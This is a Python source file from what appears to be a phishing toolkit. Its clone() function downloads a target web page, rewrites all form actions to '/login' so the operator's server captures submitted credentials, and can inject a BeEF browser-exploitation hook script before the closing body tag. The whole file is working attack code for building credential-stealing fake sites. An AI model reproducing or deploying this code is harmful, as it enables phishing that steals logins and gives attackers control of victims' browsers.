import requests
import re
import os

# CLONING FUNCTIONS --------------------------------------------------------------------------------------------
def clone(url, user_agent, beef):
    try:
        u = url.replace('://', '-')
        q = f'templates/fake/{user_agent}/{u}'
        os.makedirs(q, exist_ok=True)
        temp_ind_path = f'templates/fake/{user_agent}/{u}/index.html'
        headers = {'User-Agent': user_agent}
        r = requests.get(url, headers=headers)
        html = r.text
        old_regular = re.findall(r'action="([^ >"]*)"',html)
        new_regular = '/login'
        for r in old_regular:         
            print(r)
            html = html.replace(r, new_regular)
        if beef == 'yes':
            inject = '<script src=":3000/hook.js" type="text/javascript"></script></body>'
            html = html.replace("</body>", inject)
        with open(temp_ind_path, 'w') as new_html:
            new_html.write(html.encode('ascii', 'ignore').decode('ascii'))
    except:
        pass
#--------------------------------------------------------------------------------------------------------------------